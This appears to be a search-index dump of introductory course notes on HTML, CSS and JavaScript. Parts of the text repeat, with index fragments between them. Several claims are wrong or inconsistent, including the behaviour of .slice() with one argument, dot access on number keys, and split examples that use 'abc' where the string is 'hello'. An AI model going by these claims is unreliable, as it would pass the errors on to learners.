Javascript is a builtin datatype. var myStr = \"hello\"; We can access the characters in the string myStr by their positions. myStr[0] returns a string containing the first character of myStr . myStr[myStr.length-1] returns a string containing the last character of myStr . myStr.length computes the length of myStr . myStr + \" 123\" returns a new string by concatenating myStr to another string \" 123\" . Note that myStr remains unchanged. Alterantively, we could use myStr.concat(\" 123\") , which produces the same result. If we would to store the result of concatention, we need to assign it to a new variable. var newStr = myStr + \" 123\"; We can also use ${} to embed a string variable into a template string. A template string is enclosed with (`) instead of (\"). var newStr = `${myStr} 123`; We may split a string into smaller string by .split() method. var myStrs = newStr.split(\" \"); // Array(2) [\"abc\", \"123\"] In the above, we split newStr into an array of two substrings, with \" \" as the separator. We will discuss JavaScript arrays shortly. Note that we can call .split(\"\") , we split the string into substrings where each substring is a character from the original string. var myChars = newStr.split(\"\"); // Array(7) [ \"a\", \"b\", \"c\", \" \", \"1\", \"2\", \"3\" ] When we call .split() without any argument the string is not splitted and the result array contains one element which is the whole string. var notSplitted = newStr.split(); // Array [ \"abc 123\" ] There are three different methods for extracting a sub-string from a string in JavaScript myStr.substring(1,3); // \"bc\" extracts the subtring starting from index 1 until 2 . The first argument is the starting index and the second one is the end index (which is excluded in the output). Note that it is uncommon, but if the second argument is greater than the first one, JavaScript automatically flips the two arguments. myStr.substr(1,2); // \"bc\" extracts the subtring starting from index 1 until 2 . The first argument is the starting index and the second one is the length of the substring. myStr.slice(1,3); // \"bc\" behaves the same as .substring() . However, when .slice() is given a single argument, it behaves like the index access. myStr.slice(2) == myStr[2]; .slice() accepts negative integers as arguments. myStr.slice(-3); // last three // \"abc\" myStr.slice(-2); // last two // \"bc\" myStr.slice(-3,-1); // the third last followed by the second last. // \"ab\" Array In JavaScript, we use [ and ] to enclose a sequence of items to create an array. var myArr = [\"a\", \"b\", \"c\"]; Similar to String, we may use [idx] to access an element of an array at position idx . myArr[0]; // \"a\" And the .slice() method also works on array. myArr.slice(1,3); // Array [\"b\", \"c\"] The .reverse() method revesrse the array in-place. myArr.reverse(); myArr; // Array [\"c\", \"b\", \"a\"] Like string, .concat() method concatenates two arrays to produce a new one. myArr.concat([\"d\"]); // Array [\"c\", \"b\", \"a\", \"d\"] Note that the + operator does not concatenate arrays. myArr + [\"d\"]; // 'c,b,ad' Method join() joins all the elements of an array back to a string, assuming all elements are string or can be converted to string. myArray.join(\",\"); // \"c,b,a\" Method push() inserts a new element at the end of the array and pop() removes the last element. These two elements turn an array into a stack data structure. myArr.push(\"d\"); myArr; // Array [\"c\", \"b\", \"a\", \"d\"] myArr.pop(); // \"d\" myArr; // Array [\"c\", \"b\", \"a\"] To insert an element at the begining of an array, we may use the .unshift() method. myArr.unshift(\"d\"); myArr; // Array [\"d\", \"c\", \"b\", \"a\"] Note that unshift can insert more than one elements, e.g. arr.unshift(e1, e2,...) . To insert an element at a particular position of an array, we use .splice() method. myArr.splice(1, 0, \"z\"); myArr; // Array [\"d\", \"z\", \"c\", \"b\", \"a\"] In the above, we call splice() with three arguments. The first argument denotes the index position of the array that we would like to insert the new element. the second argument specifies how many arguments we would like to remove from this position onwards before the insertion. In this case we don't want to remove any existing element. The third argument denotes the new element that we would like to insert. Without any surprise, we may also use splice() to remove elements from an array. myArr.splice(1,1); myArr; // Array [\"d\", \"c\", \"b\", \"a\"] Object Objects in JavaScritpts are key-value collection. It is very similar to the dictionary found in Python. var myObj = { 'apple': 100, 'orange': 50 }; myObj['apple']; // 100 myObj['durian'] = 200; myObj; // { 'apple': 100, 'orange': 50, 'durian': 200 } Given a key of an object is of string type, besides using obj[key] to access the value, we may use the dot operator to access the value associated with the key. myObj.durian; // 200 Besides strings as keys, we can use numbers as keys in JavaScript objects, though it is uncommon. myObj[1] = 1000; myObj[1]; // 1000 However we can use dot operator to access values associated with number keys in JavaScript objects. myObj.1; // syntax error To remove a key from a JavaScript object, we may use the delete operator. delete myObj[1]; myObj; // { 'apple': 100, 'orange': 50, 'durian': 200 } Given an object o , Object.keys(o) returns all the keys in this object and Object.entries(o) returns all the key-value pairs in the object. Object.keys(myObj); // ['apple', 'orange', 'durian'] Object.entries(myObj); // [['apple', 100], ['orange', 50], ['durian', 200]] Control flow statements Like other general purpose language, JavaScript offers the following standard control flow statements. if-else var apple_count = null; if ('apple' in myObj) { apple_count = myObj.apple; } else { apple_count = 0; } In the above we assign the value associatd with the key apple in myObj if apple exists in myObj 's key set. Otherwise, 0 is assigned. As a side note, null denotes a null value in JavaScript. It means \"not-exist\". for var sum = 0; var kvs = Object.entries(myObj); for (let i = 0; i < kvs.length; i++) { sum = sum + kvs[i][1]; } sum; // 350 In the above snippet, we use a for loop to compute the sum of all values in the object myObj . First we initialize the sum variable to 0 . We compute the key-value entries in myObj and store them kvs . In the third statement, we use a for-loop it iterate through every key-value pair and extract the value. In the for statement, we make use of an index variable i . Starting from 0, i can be used to make reference to the i+1 -th entry in the array kvs . At the end of each iteration we increment i by 1. The loop stops when i == kvs.length . Local scope Note that in the for statement we use let to declare a variable i . The difference between var and let is as follows, 1. Variables declared with var is accessible in the entire function body. 2. Variables declared with let is accessible within the current statement. In the above example, i is not accessible before and after the for-loop. Besides var and let , we can declare a constant variable using const const pi = 3.14; Constant variables are immutable, i.e. once assigned their values cannot be updated. For-in and For-of We could rewrite the for-loop in the following for (let i in kvs) { sum = sum + kvs[i][1]; } In this case i denotes the indices of array kvs . Alternatively, for (let kv of kvs) { sum = sum + kv[1]; } In this case kv denotes an element from the array kvs . While Besides for-loops, we can repeat operations with while . var i = 0; while (i < kvs.length) { sum = sum + kvs[i][1]; i++; } Looping with closures Given an array, we can use .forEach(p) to apply p to each element in the array. In this case the function p does not produce output. kvs.forEach(function (kv) { sum = sum + kv[1]; }); In the above we apply .forEach to an anonymous function add kv[1] to the running sum. Note that in JavaScript, function( args1, ... ) { // body } defines an anonymouse function, alternatively we can write (args1, ..., ) => { // body } If we want to apply a function f to each element in the input array to produce a new array, we use .map(f) . var kvs2 = kvs.map(function (kv) { return [kv[0].toUpperCase(), kv[1]]; }); kvs2; // [['APPLE', 100], ['ORANGE', 50], ['DURIAN', 200]] Note that in JavaScript there is not tuple (1,2,3) . JavaScript Operators Binary Operators Operators are predefined symbols in JavaScripts that allows us to compute result. For instance var x = 3; var y = 1; var z = x + y; // z is 4 In the above context, this operator + sums up its given arguments since both are in number type. typeof(x); // number typeof(y); // number The binary operator + is overloaded. var a = \"3\"; var b = 1; var c = a + b; // what is c? In the above + 's left operand is a string and the right is a number, JavaScript performs some implicit type coercion to convert the second operand to string, hence + becomes a string concatenation operator. Another commonly use binary operator in JavaScript is == which used for comparison. var i = 100; var isEven = i % 2 == 0; // isEven is true What about? var isEven2 = i % 2 == \"0\"; // isEven2 is true or false? JavaScript coerces the right operand from string to number for us, hence isEven2 is true However there situations in which such an implicit type coercion is dangerous var isEven3 = i % 2 == \"\"; // isEven3 is true??!? To prevent this kind of situation, it's better to use a coercion-free comparison. var isEven4 = i % 2 === \"\"; // isEven4 is false! Things for you to check. Please try to test out the following yourself, (try with different browsers). Add a number to a null value. Add a number to a NaN value. Compare two string values. Compare a number to a string value. Unary Operators Operators taking only one operand are called unary operators. For instance, the - symbol is a unary operator as it takes a numerical operand and changes the sign of the operand. The ! symbol is another unary operator which takes boolean expression and return negation of the operand. Function Recall that function keyword in JavaScript defines a function. function sum(x, y) { return x + y; } In the above we define a function with name sum which takes two arguments, returns the sum of the two arguments. function incr(x) { return x + 1; } Class In JavaScript, we can define a custom template for creating objects. class Rect { constructor(w,h) { this.width = w; this.height = h; } area() { return this.width * this.height; } } var r = new Rect(10,5); console.log(r.area()); In the above code snippet, we define a class Rect . Every object instance of Rect has a width and a height attribute. The constructor() is a special method AKA the cosntructor method , which is invoked when we instantiate an object instance from a class via the new keyword. Besides the constructor method, the Rect class defines an area() method which computes the area of the object. To invoke a normal method, we use the . operator. Like many OOP languages, class allows us to define run-time data types by instantiatiating from a fixed template. Note that objects are isolated. var r1 = new Rect(10,5); console.log(r); console.log(r1); With the above we find that r and r1 share the same structure and content. (Note that neither r == r1 nor r === r1 yields true because == and === are checking references, since r and r1 are objects stored in different memory locations, the results are false ). Inheritance (Only available in ES6 onwards) Since JavaScript version ES6, we can define subclasses using the extends keyword. class Square extends Rect { constructor(s) { super(s,s); this.side = s; } } var s = new Square(10); console.log(s.area()); With inheritence objects instantiated from a subclass inherits methods and attributes belong to the base classes. Most of the modern browsers support ES6. In case you need to handle some legacy browsers, or you would like understand how class and inheritance were compiled, you could read up the references JavaScript prototypes and prototype inheritance https://www.freecodecamp.org/news/prototypes-and-inheritance-in-javascript/#:~:text=In%20JavaScript%2C%20an%20object%20can,from%20other%20objects%20%E2%80%94%20the%20prototypes. Higher order functions Functions as inputs We have seen how functions are used in JavaScript in the previous unit. We consider some advanced usage of functions. function incr(x) { return x + 1; } function twice(f,x) { return f(f(x)); } console.log(twice(incr,10)); // 12 In the above we define a function incr which increments a numerical input by 1 . Then we define a function twice , which takes a function argument f and another argument x . Assuming f 's input's domain subsumes the output's domain, in twice , we apply f to x to produce an intermediate result then applies f again to the intermediate result. twice is known as a higher order function as it takes another function has its input argument. Using higher order functions allows us to reuse codes. function dbl(x) { return x * 2; } console.log(twice(dbl,10)); // 40 Functions as returned values In situation, we might want to define functions that return another function as result. function part_sum(x) { return (function (y) { return x + y }); } var incr_too = part_sum(1); console.log(twice(incr_too, 10)); In the above, we define a partial sum function, part_sum which takes an input x and returns an anonymous function that expects some input y and returns the sum of x and y . Thanks to the variable scope, the x in the returned function closure refers to the x argument of part_sum . We can now define a function incr_too by applying part_sum to 1 . It should behave the same as incr , since incr_too is a reference to the anonymous function produced by part_sum(1) that expects y and adds 1 to y . In this case, part_sum is also a higher order function as its returned value is another function. Functions as call-backs Function call-backs , also known as continuations, turn out to be very useful for us to define operations that should be performed in sequence. For instance, var x = 1; var y = incr(x); var z = dbl(y); console.log(z); In the above we would like to increment x by 1 then multiply the intermediate result y by 2 . With call-backs, we could rewrite the above as function incr_with_callback(x, f) { var r = incr(x); f(r); } function dbl_with_callback(y, g) { var r = dbl(y); g(r); } var x = 1; incr_with_callback(x, function(y){ dbl_with_callback(y, function(z) { console.log(z); }) }) We introduce some variants of incr and dbl by calling the original functions to obtain the result. Instead of returning the results, we pass the results to the call back functions f (or g ). f (and g ) are known as the continuations, which means when the main function terminates, it continues the execution by calling f (and g ). These two versions should produce the same result. One may argue that the second one is too hard to read and does not bring any significant value over the first version. Application of Call-backs Call-backs are widely used in JavaScript. One essential usage of call-back is to support asynchronous progamming. Asynchronous Programming Synchronous programming means instructions are executed one after another. On the other hand, asynchronous programming means instructions are not executed in the order they are structured. We need this \"out-of-order\" execution when there exists some long-running instruction that occurs in the middle of the program, but we do not want this long-running instruction to block the rest of instructions. One possible way to actualize asynchronous programming is to leverage multi-threading, i.e. to spawn a new thread from the main thread to execute the long-running instruction (e.g. what we did using Java in 50.001). However implementing asynchronous programming with multi-threading might lead to extra memory overhead, because each thread needs to pre-allocate and maintain its own call stack space and heap memory, e.g. (in older version of Java, the default heap size for a thread is 2MB). In a UI-based application, most of the asynchronous tasks do not require such heap space, e.g. 1. we need a separate instruction sequence to periodically check whether the button is clicked, or 2. we need a separate instruction sequence to call an exernal API and wait for the result to return. Single threaded Event-driven Programming JavaScript takes a different approach in supporting asynchronous programming without using multi-threading. From this point onwards, we narrow the definition of \"callbacks\" to be the functions that will be invoked when an event occurs. Like many other languages, JavaScript executes a program with a call stack and a heap. Heap is a memory space for us to store non-primitive value such as objects, strings and arrays. For now our focus is on the call stack. When a JavaScript starts a main frame is added to the call stack, global variables are stored in the main frame. When there is a function call, a new frame is placed on-top of the call stack. Local variables with primitive values are stored inside the frame. The frame is then popped when the function returns. The main frame is popped when all instructions in the JavaScript program has been executed. For example function f(x) { var y = x + 1; return g(y); } function g(z) { return z*2; } f(10); In the above program, we define two functions f and g . The call stack begins with the folowing frame. graph LR; id3(main) The main program call f(10) . We place a new frame on the call stack. When executing f(10) , we assign 10+1 to a local variable y in the call frame of f(10) . graph LR; id2(\"f(10)<br/>y=11\") id3(main) Before returning the result, we call g(y) which is g(11) which creates another call frame. The following diagram shows the call stack with three frames when the program execution point is right before return z*2 . graph LR; id1(\"g(11)\") id2(\"f(10)<br/>y=11\") id3(main) As g(11) call returns we remove the top most frame, i.e. g(11) , then back to the frame f(10) . graph LR; id2(\"f(10)<br/>y=11\") id3(main) We return 22 as result and remove the second frame, f(10) . graph LR; id3(main) Lastly, we remove the main frame as we reach to the end of the program. Things become more interesting in the presence of call-back functions associated with some UI elements. Recall one of our earlier examples, function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var span1 = document.getElementById(\"span1\"); span1.innerHTML = textbox1.value; } function run() { var button1 = document.getElementById(\"button1\"); button1.addEventListener(\"click\", handleButton1Click); } document.addEventListener( \"DOMContentLoaded\", run); The program contains three portions, the two function definitions and a statement. JavaScript run-time in the browser executes them sequentially and synchronously, in the main call frame. To illustrate the step by step program execution let's consider the following table. The first column is the program counter. The second column captures the call stack, for simplicity, we use python's style list to represent a stack, where the left most element the bottom frame. The third column is a mapping from (UI) events to call-back functions, we use Python's style dictionary syntax. The fourth coulumn is the callback queue (again we use python's list style) program counter (line num) call stack event reg table callback queue 1 [main] {} [] 6 [main] {} [] 10 [main] { DomContentLoaded : run } [] The run-time first execute the function declaration in line 1, in call frame main , which does not affect the event registeration table nor the callback queue. Similar observation applies when it move on to execute the function declaration in line 6. When the program counter is at line 10, we are add the last statement of the main program. Add an event listener to the even DOMContentLoaded , which creates an entry to the even registration table, mapping DOMContentLoaded to the function run as callback. After line 10, the call stack becomes empty as main ended. However the JavaScript run-time for rendering this web page is still running. It is executing an event-loop, in which it periodically check whether there is anything is the callback queue. At this point in time the browser continues to render the HTML page. When the HTML document is fully rendered, the browser triggers an DomContentLoaded event. At this point the callback function run associated with the event is enqueued to the callback queue. Since the call stack is empty and the callback queue is not, the JavaScript run-time dequeues run from the callback queue and creates a call frame in the call stack. It continues to move the program counter from lines 7-9. program counter (line num) call stack event reg table callback queue ... ... ... ... [] { DomContentLoaded : run } [ run ] 7 [ run ] { DomContentLoaded : run } [] 8 [ run ] { DomContentLoaded : run } [] 9 [ run ] { DomContentLoaded : run , button1.click : handleButton1Click } [] At the end of line 9, a new event ( button1 being clicked) is being registered, mapping to handleButton1Click . The call stack becomes empty again. The JavaScript run-time goes into the event loop again, waiting for next event to take place. When someone clicks on the button button1 , the callback function handleButton1Click will be enqeued into the callback queue. The run-time will \"move\" it into the call stack to execute it. We have purposely ignored something ... Actually, besides the callback, there are something called promises which enable JavaScript code to support asynchronous programming. We will discuss it in details in the next class. Cohort Exercise (Not Graded) Add some console.log() to the buttonandtext.js and open buttonandtext.html to observe in what order the call backs are executed. (Graded) Complete the following HTML and JavaScript codes, so that when the button Submit is clicked, the min and the max of the sequence of numbers (seperated by \",\") entered in the input text box will be displayed in the span elements. <!DOCTYPE html> <html> <head> <script src=\"minmax.js\"> </script> <meta charset=\"utf-8\"/> <title>50.003 sample code: Min and Max </title> </head> <body> <div>Your input: <input id=\"textbox1\" type=\"text\" /> </div> <div>Min: <span id=\"min\"></span></div> <div>Max: <span id=\"max\"></span></div> <div><button id=\"button1\">Submit</button></div> </body> </html> function numbers(l) { var o = []; for (let i in l) { var n = parseInt(l[i],10); if (!isNaN(n)) { o.push(n); } } return o; } // input: an array of numbers // output: an object containing 'min', with the minimum of the array and 'max' the maximum of the array. function min_max(a) { var min = null; var max = null; // TODO: fixme return { 'min' : min, 'max' : max} } function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var min = document.getElementById(\"min\"); var max = document.getElementById(\"max\"); var items = textbox1.value.split(\",\"); var obj = min_max(numbers(items)); min.innerHTML = obj['min']; max.innerHTML = obj['max']; } function run() { var button1 = document.getElementById(\"button1\"); // TODO: fixme } document.addEventListener( \"DOMContentLoaded\", run);","title":"50.003 - Basics of Web Programming"},{"location":"notes/l4_1_web_prog_common_js/#50003-basics-of-web-programming","text":"","title":"50.003 - Basics of Web Programming"},{"location":"notes/l4_1_web_prog_common_js/#learning-outcomes","text":"By the end of this unit, you should be able to Define an HTML document with elements and attributes. Define the cosmetic and layouts of an HTML documents using CSS. Use JavaScript to capture user inputs from HTML documents. Use JavaScript to render output to the HTML documents. Apply JavaScript operators to compute results Define customized JavaScript datatype using class Define named and anonymous functions in JavaScript Describe the semantics of Common JavaScript","title":"Learning Outcomes"},{"location":"notes/l4_1_web_prog_common_js/#basic-components-of-a-web-application","text":"A Web application consists of two major parts. Front-end - the user interface, is often presented with a browser on the PC or on the mobile devices. The front-end loads and presents the required data to the users. The front-end also captures the user's inputs and translates them into system actions to be performed by the web application (both frontend or backend). Back-end - the application's brain. It is often made up of the business logic layer and the data layer. The data layer takes care of the data storage, query and manipulation, while the business logic layer implements the defined actions to be perform given the user inputs (from the front-end).","title":"Basic Components of A Web Application"},{"location":"notes/l4_1_web_prog_common_js/#common-front-end-software-components","text":"HTML CSS JavaScript","title":"Common front-end software components"},{"location":"notes/l4_1_web_prog_common_js/#common-back-end-software-components","text":"A database or a set of databases A backend application server or a set of back-end application servers A set of cache storage (optional) A group of load balancers (optional)","title":"Common back-end software components"},{"location":"notes/l4_1_web_prog_common_js/#html","text":"Hyper Text Markup Language is a language to define the structure of a document (AKA a web page). <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"/> <title>50.003</title> </head> <body> <p class=\"heading\">Welcome to 50.003!</p> <p id=\"msg1\" class=\"message\">It's about Software Engineering!</p> </body> </html> There are many versions/standards of HTML. We only consider HTML5 in this unit. An HTML document consists of a doctype decleration, which tells the brower which version of HTML it is in. The second part is an <html> element. Each element consists of an open tag and a close tag and the children. For instance, <html> is the opening tag and </html> is the closing. The children of an elemnent can be elements or texts. However there are a set of rules governing what contents could appear in a given element. In the above example, the content of the <html> element consists of a <head> elemnt and a <body> elemnent. Element without child/content can be written in a short form, e.g. <meta charset=\"utf-8\" /> is a short hand of <meta charset=\"utf-8\"></meta> . Note that charset=\"utf-8\" denotes an attribute of this <meta> element. The HTML document in the above example defines a structure as follows, html head meta title text body paragraph text","title":"HTML"},{"location":"notes/l4_1_web_prog_common_js/#css","text":"Cascading Style Sheets is a language used in describing the presentation of a document. Being different from HTML, it focuses on the aesthetical requirement of the documents. For instance, it defines the answers to the following questions, Which font family should the title text be rendered in? How many pixels should the text margin be? ... and etc. p { margin:10px; } #msg1 { font-family:'Courier New', Courier, monospace; } .heading { font-size:larger; } There are three rules in the above CSS. Each rule consists two parts. 1. terms preceding the { are called the selectors. 2. terms being enclosed by { and } are called the declarations. * Each declaration consists of a property (preceding the colon : ) and a value (following the colon : ). * Declarations are terminated by a semi colon ; . For instance, in the first rule, we find p as the selector, which means that this rule is applicable to all <p> elements in the target HTML document. For all applicable elements, we want to set the margin to be 10 pixel wide. The second rule applies to a particular element with id = #msg1 . Note that ids in an HTML document must be unique. In this rule, we want to set the font family of the text contained in the applicable elements to Courier New . In the third rule, we would like to apply the declaration to all elements with class attribute equal to heading . Suppose the above css definitions are stored in a file named hello.css , we could add the following as one of the child element of the <head> element in the earlier html document. <!DOCTYPE html> <html> <head> <link rel=\"stylesheet\" href=\"hello.css\"/> ... </head> <body> ... </body> </html> Note that selectors are composable , e.g. selector p.heading selects all <p> elements with class equal to heading . For information refers to https://www.w3schools.com/cssref/css_selectors.php","title":"CSS"},{"location":"notes/l4_1_web_prog_common_js/#overlapping-css-rules","text":"Suppose we add a new CSS rule to the earlier CSS p { margin:10px; } #msg1 { font-family:'Courier New', Courier, monospace; } .heading { font-size:larger; } // new rule p.message { margin:5px; } The first and the newly added rules are overlapping, i.e. the set of HTML elements they select are overlapping, i.e. <p id=\"msg1\" class=\"message\">It's about Software Engineering!</p> is selected by both rules. However the declarations of the two rules are not compatible. In such a situation, CSS interpretors will pick the one with higher specificity to apply the selected HTML element. For details on how specificity score is calculated, refer to the following https://www.w3.org/TR/CSS21/cascade.html#specificity","title":"Overlapping CSS rules"},{"location":"notes/l4_1_web_prog_common_js/#javascript","text":"JavaScript is a programming language that was initially designed to run in the browsers. Its internal design was influenced by Lisp and Scheme, it s external syntax was strongly influence by Java, though its behavior differs from Java. In the last decade, JavaScript was extended to run directly in the backend systems as well. In this unit, we consider the version of JavaScript that run in the browsers.","title":"JavaScript"},{"location":"notes/l4_1_web_prog_common_js/#a-simple-example","text":"First we modify the HTML document introduced earlier to include a <script> element. Note that we can't use <script/> short-hand as it won't work in certain browsers. <!DOCTYPE html> <html> <head> <link rel=\"stylesheet\" href=\"hello.css\"/> <script src=\"hello.js\"> </script> ... </head> <body> ... </body> </html> The content of the hello.js file is as follows. console.log(\"hello\"); In the above, we define a JavaScript program that prints a string hello in the console. Note that the printed string will not appear in the HTML page, instead it is printed in the console of the browser Chrome and Edge: \"three vertical dot\" -> \"More Tools\" -> \"Developer Tools\" -> \"Console\" Firefox: \"three horizontal bars\" -> \"More Tools\" -> \"Web Developer Tools\" -> \"Console\" Alternatively, we may also use online learning tools such as https://jsfiddle.net/ To display \"hello\" message in a pop-up window, we could change the console.log() method with alert() . var msg = \"hello\"; // console.log(msg); alert(msg); In the above, we have 3 lines code JS codes. In the first statement we define a variable msg with value \"hello\" . In JavaScript var keyword in define a variable. The second statement the console.log() that we used previously and it is commented away. The third statement is a method call to alert() with msg as the actual argument. Lastly, if we want to add a string to the begining of the HTML document, we may use document.write() method. var msg = \"hello\"; /* console.log(msg); alert(msg); */ document.write(msg); In the above we use /* ... */ to comment multiple lines. document is a predefined variable holding the reference of the current HTML document. document.write() takes a string and inserts it to the begining of the document. Note that the semi-colon at the end of each statment is optional.","title":"A Simple Example"},{"location":"notes/l4_1_web_prog_common_js/#inputoutput","text":"One may ask, \"what about displaying the message inside some of the HTML element?\"","title":"Input/Output"},{"location":"notes/l4_1_web_prog_common_js/#first-attempt","text":"Suppose we change the Javascript program as follows var msg = \"hello\"; var p_elem = document.getElementById(\"msg1\"); p_elem.innerText = msg; In the second statement, we call document.getElementById() to retrieve the reference to the element with id= msg1 in the HTML document and store the reference in a variable p_elem . In the third statement, we set the inner HTML of this element as msg . Howe when we load the HTML with the above script, some error occured. Uncaught TypeError: p_elem is null. This is because we retrieve the element reference before the document is fully rendered hence p_elem is having a null reference.","title":"First attempt"},{"location":"notes/l4_1_web_prog_common_js/#second-attempt","text":"To fix this problem, we need to postpone the JavaScript execution until =the doucment is fully rendered. There are two possible ways to do that. 1. Write a busy loop to keep checking whether the document is fully rendered. 2. Enclose the action (of updating the content of the <p id=\"msg1\"> element) in a function. Make this function into a call-back, which will only be invoked when the document is done with rendered. To keep the resource usage low, JavaScript adopts the 2nd idea. var msg = \"hello\"; function run() { var p_elem = document.getElementById(\"msg1\"); p_elem.innerText = msg; } document.addEventListener( \"DOMContentLoaded\", run); In the above, we define a function named run with no argument. The body of the function contains the action to be performed when the document is fully rendered. In the last statement, we register the run() function as the call-back of the event \"DOMContentLoaded\" of the document object. The function run() is able to access the variable msg defined outside. In JavaScript this is called closure .","title":"Second attempt"},{"location":"notes/l4_1_web_prog_common_js/#capturing-the-user-input","text":"Now let's add a textbox in the HTML document and capture the user's input in this textbox via a button click. Consider textandbutton.html as follows, <!DOCTYPE html> <html> <head> <script src=\"textandbutton.js\"> </script> <meta charset=\"utf-8\"/> <title>50.003 sample code: Text and Button</title> </head> <body> <div>Your input: <input id=\"textbox1\" type=\"text\" /> </div> <div>Output: <span id=\"span1\"></span></div> <div><button id=\"button1\">Submit</button></div> </body> </html> In the above HTML document, we find three components in the body, an <input> , a <span> as output field and a <button> . In the textandbutton.js we have the following definitions. function handleButton1Click() { var textbox1 = document.getElementById(\"textbox1\"); var span1 = document.getElementById(\"span1\"); span1.innerHTML = textbox1.value; } function run() { var button1 = document.getElementById(\"button1\"); button1.addEventListener(\"click\", handleButton1Click); } document.addEventListener( \"DOMContentLoaded\", run);","title":"Capturing the user input"},{"location":"notes/l4_1_web_prog_common_js/#basic-data-structures","text":"","title":"Basic Data Structures"},{"location":"notes/l4_1_web_prog_common_js/#string","text":"String in Javascript is a builtin datatype. var myStr = \"hello\"; We can access the characters in the string myStr by their positions. myStr[0] returns a string containing the first character of myStr . myStr[myStr.length-1] returns a string containing the last character of myStr . myStr.length computes the length of myStr . myStr + \" 123\" returns a new string by concatenating myStr to another string \" 123\" . Note that myStr remains unchanged. Alterantively, we could use myStr.concat(\" 123\") , which produces the same result. If we would to store the result of concatention, we need to assign it to a new variable. var newStr = myStr + \" 123\"; We can also use ${} to embed a string variable into a template string. A template string is enclosed with (`) instead of (\"). var newStr = `${myStr} 123`; We may split a string into smaller string by .split() method. var myStrs = newStr.split(\" \"); // Array(2) [\"abc\", \"123\"] In the above, we split newStr into an array of two substrings, with \" \" as the separator. We will discuss JavaScript arrays shortly. Note that we can call .split(\"\") , we split the string into substrings where each substring is a character from the original string. var myChars = newStr.split(\"\"); // Array(7) [ \"a\", \"b\", \"c\", \" \", \"1\", \"2\", \"3\" ] When we call .split() without any argument the string is not splitted and the result array contains one element which is the whole string. var notSplitted = newStr.split(); // Array [ \"abc 123\" ] There are three different methods for extracting a sub-string from a string in JavaScript myStr.substring(1,3); // \"bc\" extracts the subtring starting from index 1 until 2 . The first argument is the starting index and the second one is the end index (which is excluded in the output). Note that it is uncommon, but if the second argument is greater than the first one, JavaScript automatically flips the two arguments. myStr.substr(1,2); // \"bc\" extracts the subtring starting from index 1 until 2 . The first argument is the starting index and the second one is the length of the substring. myStr.slice(1,3); // \"bc\" behaves the same as .substring() . However, when .slice() is given a single argument, it behaves like the index access. myStr.slice(2) == myStr[2]; .slice() accepts negative integers as arguments. myStr.slice(-3); // last three // \"abc\" myStr.slice(-2); // last two // \"bc\" myStr.slice(-3,-1); // the third last followed by the second last. // \"ab\"","title":"String"},{"location":"notes/l4_1_web_prog_common_js/#array","text":"In JavaScript, we use [ and ] to enclose a sequence of items to create an array. var myArr = [\"a\", \"b\", \"c\"]; Similar to String, we may use [idx] to access an element of an array at position idx . myArr[0]; // \"a\" And the .slice() method also works on array. myArr.slice(1,3); // Array [\"b\", \"c\"] The .reverse() method revesrse the array in-place. myArr.reverse(); myArr; // Array [\"c\", \"b\", \"a\"] Like string, .concat() method concatenates two arrays to produce a new one. myArr.concat([\"d\"]); // Array [\"c\", \"b\", \"a\", \"d\"] Note that the + operator does not concatenate arrays. myArr + [\"d\"]; // 'c,b,ad' Method join() joins all the elements of an array back to a string, assuming all elements are string or can be converted to string. myArray.join(\",\"); // \"c,b,a\" Method push() inserts a new element at the end of the array and pop() removes the last element. These two elements turn an array into a stack data structure. myArr.push(\"d\"); myArr; // Array [\"c\", \"b\", \"a\", \"d\"] myArr.pop(); // \"d\" myArr; // Array [\"c\", \"b\", \"a\"] To insert an element at the begining of an array, we may use the .unshift() method. myArr.unshift(\"d\"); myArr; // Array [\"d\", \"c\", \"b\", \"a\"] Note that unshift can insert more than one elements, e.g. arr.unshift(e1, e2,...) . To insert an element at a particular position of an array, we use .splice() method. myArr.splice(1, 0, \"z\"); myArr; // Array [\"d\", \"z\", \"c\", \"b\", \"a\"] In the above, we call splice() with three arguments. The first argument denotes the index position of the array that we would like to insert the new element. the second argument specifies how many arguments we would like to remove from this position onwards before the insertion. In this case we don't want to remove any existing element. The third argument denotes the new element that we would like to insert. Without any surprise, we may also use splice() to remove elements from an array. myArr.splice(1,1); myArr; // Array [\"d\", \"c\", \"b\", \"a\"]","title":"Array"},{"location":"notes/l4_1_web_prog_common_js/#object","text":"Objects in JavaScritpts are key-value collection. It is very similar to the dictionary found in Python. var myObj = { 'apple': 100, 'orange': 50 }; myObj['apple']; // 100 myObj['durian'] = 200; myObj; // { 'apple': 100, 'orange': 50, 'durian': 200 } Given a key of an object is of string type, besides using obj[key] to access the value, we may use the dot operator to access the value associated with the key. myObj.durian; // 200 Besides strings as keys, we can use numbers as keys in JavaScript objects, though it is uncommon. myObj[1] = 1000; myObj[1]; // 1000 However we can use dot operator to access values associated with number keys in JavaScript objects. myObj.1; // syntax error To remove a key from a JavaScript object, we may use the delete operator. delete myObj[1]; myObj; // { 'apple': 100, 'orange': 50, 'durian': 200 } Given an object o , Object.keys(o) returns all the keys in this object and Object.entries(o) returns all the key-value pairs in the object. Object.keys(myObj); // ['apple', 'orange', 'durian'] Object.entries(myObj); // [['apple', 100], ['orange', 50], ['durian', 200]]","title":"Object"},{"location":"notes/l4_1_web_prog_common_js/#control-flow-statements","text":"Like other general purpose language, JavaScript offers the following standard control flow statements.","title":"Control flow statements"},{"location":"notes/l4_1_web_prog_common_js/#if-else","text":"var apple_count = null; if ('apple' in myObj) { apple_count = myObj.apple; } else { apple_count = 0; } In the above we assign the value associatd with the key apple in myObj if apple exists in myObj 's key set. Otherwise, 0 is assigned. As a side note, null denotes a null value in JavaScript. It means \"not-exist\".","title":"if-else"},{"location":"notes/l4_1_web_prog_common_js/#for","text":"var sum = 0; var kvs = Object.entries(myObj); for (let i = 0; i < kvs.length; i++) { sum = sum + kvs[i][1]; } sum; // 350 In the above snippet, we use a for loop to compute the sum of all values in the object myObj . First we initialize the sum variable to 0 . We compute the key-value entries in myObj and store them kvs . In the third statement, we use a for-loop it iterate through every key-value pair and extract the value. In the for statement, we make use of an index variable i . Starting from 0, i can be used to make reference to the i+1 -th entry in the array kvs . At the end of each iteration we increment i by 1. The loop stops when i == kvs.length .","title":"for"},{"location":"notes/l4_1_web_prog_common_js/#local-scope","text":"Note that in the for statement we use let to declare a variable i . The difference between var and let is as follows, 1. Variables declared with var is accessible in the entire function body. 2. Variables declared with let is accessible within the current statement. In the above example, i is not accessible before and after the for-loop. Besides var and let , we can declare a constant variable using const const pi = 3.14; Constant variables are immutable, i.e. once assigned their values cannot be 